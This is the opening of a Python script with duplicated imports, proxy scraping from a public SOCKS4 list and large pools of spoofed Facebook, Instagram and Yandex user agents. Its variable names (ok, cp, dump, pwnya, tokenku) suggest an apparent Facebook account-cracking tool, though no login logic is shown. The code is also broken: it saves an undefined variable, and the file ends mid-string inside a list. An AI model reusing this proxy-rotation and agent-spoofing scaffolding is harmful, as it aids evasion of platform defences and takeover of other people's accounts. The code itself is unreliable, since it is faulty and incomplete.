#----------[ IMPORT-MODULE ]----------#
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.panel import Panel as nel
#----------[ GLOBAL-NAME ]----------#
#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import re,requests,os,time
import os,sys
import socket,threading
import datetime
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as AsepXc
from bs4 import BeautifulSoup as parse
from time import time as mek
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track
from pwinput import pwinput
from rich.console import Console
sys.stdout.write('\x1b]2; HiLboiZ\x07')
wa = Console()
console = Console()
#MODUL FIX EROR#
# pretty.install()
# id2,uid=[],[]
# proxxy,ugen=[],[]
# dump,id,akun=[],[],[]
# method,tokenku=[],[]
# pwpluss,pwnya=[],[]
# loop,ok,cp=0,0,0
# CON=sol()
# console=Console()
# ses=requests.Session()
# ualu =[]
# ualuh = []


pretty.install()
id2,uid=[],[]
proxxy,ugen=[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
loop,ok,cp=0,0,0
CON=sol()
console=Console()
ses=requests.Session()
usragent = []
usrgent2 = []
ualu,ualuh = [],[]
opsi = []


# id,id2,uid = [],[],[]
# xbz,xnxx = [],[]
# tokenefb = []
# akunyeh = []
# usragent = []
# usrgent2 = []
# loop,baz = 0,[]
# ok,cp,oo = 0,0,[]
# ualu,ualuh = [],[]
#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
    

for to in range(1000):
	uas = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Windows NT 10.0.17763.253; osmeta 10.3.31799) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/9.0 Safari/602.1.1 osmeta/10.3.31799 Build/31799 [FBAN/FBW;FBAV/186.0.0.83.783;FBBV/143636256;FBDV/Inspiron757307EC;FBMD/Inspiron 7573;FBSN/Windows;FBSV/10.0.17763.678;FBSS/1;FBCR/;FBID/desktop;FBLC/en_US;FBOP/45;FBRV/0]','Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]','Mozilla/5.0 (iPad; CPU OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPad5,4;FBMD/iPad;FBSN/iPadOS;FBSV/15.6.1;FBSS/2;FBID/tablet;FBLC/de_DE;FBOP/5]','Mozilla/5.0 (Linux; Android 9; VTR-L09 Build/HUAWEIVTR-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]','Mozilla/5.0 (Linux; Android 11; SM-G980F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]','Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5]','Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBIOS;FBDV/iPad7,3;FBMD/iPad;FBSN/iPadOS;FBSV/15.6;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 10; STK-L21 Build/HUAWEISTK-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]','Mozilla/5.0 (Linux; Android 11; REVVL V+ 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]','Mozilla/5.0 (Linux; Android 10; SM-N960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/371.1.0.12.107;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E241 [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 239.2.0.17.109 (iPhone12,1; iOS 14_2; uk_UA; uk-UA; scale=2.00; 828x1792; 376668393)','Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SP2A.220505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/370.0.0.23.112;]','Mozilla/5.0 (Linux; Android 9; LG-H873 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/370.0.0.23.112;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 12; Pixel 4a Build/SP2A.220405.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/359.0.0.6.112;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]','Mozilla/5.0 (Linux; Android 11; HD1903 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/363.0.0.30.112;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 12; SM-G998U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/355.0.0.17.114;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]','Mozilla/5.0 (iPad; CPU OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18D70 [FBAN/FBIOS;FBDV/iPad8,11;FBMD/iPad;FBSN/iOS;FBSV/14.4.2;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]','Mozilla/5.0 (Linux; Android 11; CPH2119 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]','Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBDV/iPad13,1;FBMD/iPad;FBSN/iPadOS;FBSV/15.4.1;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]','Mozilla/5.0 (Linux; Android 12; SM-G988W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]','Mozilla/5.0 (Linux; Android 9; MRD-LX1F Build/HUAWEIMRD-LX1F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 10; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/353.0.0.12.116;]','Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/353.0.0.12.116;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/353.0.0.12.116;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 223.0.0.11.104 (iPhone10,6; iOS 15_2; ru_RU; ru-RU; scale=3.00; 1125x2436; 352006504)','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 227.0.0.4.115 (iPhone12,5; iOS 15_2; ru_RU; ru-RU; scale=3.00; 1242x2688; 357667025)','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 222.0.0.13.113 (iPhone12,1; iOS 14_2; ru_RU; ru-RU; scale=2.00; 828x1792; 351070346)','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/352.0.0.9.116;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/2;FBID/phone;FBLC/nl_NL;FBOP/5]','Mozilla/5.0 (Linux; Android 10; SM-A107F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/354.0.0.22.110;]','Mozilla/5.0 (Linux; Android 11; Infinix X689C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/348.0.0.11.110;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 11; SM-G975U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/347.0.0.8.115;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBIOS;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBIOS;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (Linux; Android 12; SM-G986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]'])
	pa = random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36,GingerClient/2.15.2-RELEASE','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15 Midori/6','Mozilla/5.0 (Wayland; LMozilla/5.0 (Macintosh; PPC Mac OS X; en) AppleWebKit/537.75.14 (KHTML, like Gecko) HistoryHound/1.9','Mozilla/5.0 (Macintosh; PPC Mac OS X; en) AppleWebKit/537.75.14 (KHTML, like Gecko) HistoryHound/1.9','Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)','Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE71/1.00.000; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Mozilla/5.0 (Linux; Tizen 2.2; SAMSUNG SM-Z9005) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 like Android 4.1; Safari/537.3','Opera/9.80 (SpreadTrum; Opera Mini/4.4.33961/191.283; U; en) Presto/2.12.423 Version/12.16','Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:7.0.1) Gecko/20100101 Firefox/7.0.1','Mozilla/5.0 (Android 12; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0'])
	pb = random.choice(['Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80','Mozilla/5.0 (Linux; Android 13; Infinix X6833B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 YandexSearch/7.53 YandexSearchBrowser/7.53','Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 YandexSearch/7.30 YandexSearchBrowser/7.30','Mozilla/5.0 (Linux; Android 11; ZTE Blade A31RU Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52','Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 YandexSearch/7.45 YandexSearchBrowser/7.45','Mozilla/5.0 (Linux; Android 9; SM-J730FM Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchBrowser/7.90','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 YandexSearch/7.45 YandexSearchBrowser/7.45','Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 YandexSearch/9.50 YandexSearchWebView/9.50','Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 YandexSearch/8.30 YandexSearchBrowser/8.30','Mozilla/5.0 (Linux; Android 10; SM-J600F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 8.0.0; AUM-L29 Build/HONORAUM-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36 YandexSearch/9.35 YandexSearchWebView/9.35','Mozilla/5.0 (Linux; Android 10; SM-A505FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 8.1.0; DRA-LX5 Build/HUAWEIDRA-LX5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 7.0; BAH-L09 Build/HUAWEIBAH-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Safari/537.36 YandexSearch/10.91/apad YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 9; Redmi 8A Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 YandexSearch/8.30 YandexSearchWebView/8.30','Mozilla/5.0 (Linux; Android 9; SM-A405FM Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchBrowser/7.90','Mozilla/5.0 (Linux; Android 8.1.0; SM-T585 Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Safari/537.36 YandexSearch/8.45/apad YandexSearchBrowser/8.45','Mozilla/5.0 (Linux; Android 9; SM-A505FM Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchBrowser/7.90','Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80','Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L21 Build/HUAWEICUN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 YandexSearch/7.85 YandexSearchBrowser/7.85','Mozilla/5.0 (Linux; Android 8.1.0; N210 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Safari/537.36 YandexSearch/7.45/apad YandexSearchBrowser/7.45','Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80','Mozilla/5.0 (Linux; Android 9; SM-J610FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.93 Mobile Safari/537.36 YandexSearch/8.00 YandexSearchBrowser/8.00','Mozilla/5.0 (Linux; Android 9; SM-A405FM Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.90 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchBrowser/7.90','Mozilla/5.0 (Linux; Android 9; SM-A705FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchBrowser/7.90','Mozilla/5.0 (Linux; Android 7.1.1; ZTE BLADE A0620 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36 YandexSearch/6.45','Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L21 Build/HUAWEICUN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36 YandexSearch/5.23','Mozilla/5.0 (Linux; Android 7.0; SM-J730FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 YandexSearch/8.40 YandexSearchBrowser/8.40','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 9; BQ-5731L Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 8.1.0; DRA-LX5 Build/HUAWEIDRA-LX5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 YandexSearch/10.30 YandexSearchWebView/10.30','Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41 Build/HONORAUM-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 10; BKL-L09 Build/HUAWEIBKL-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 YandexSearch/10.91 YandexSearchWebView/10.91','Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 YandexSearch/7.61 YandexSearchBrowser/7.61','Mozilla/5.0 (Linux; Android 8.1.0; SM-J260F Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 YandexSearch/10.44 YandexSearchWebView/10.44','Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) YaBrowser/16.3.3.4 YaApp_iOS/3.61','Mozilla/5.0 (Linux; Android 7.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 YandexSearch/6.45','Mozilla/5.0 (Linux; Android 9; SM-J730FM Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 YandexSearch/8.40 YandexSearchBrowser/8.40','Mozilla/5.0 (Linux; Android 4.4.2; AtlanticV Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 YandexSearch/6.51','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 YandexSearch/7.33 YandexSearchBrowser/7.33','Mozilla/5.0 (Linux; Android 9; KSA-LX9 Build/HONORKSA-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36 YandexSearch/7.30 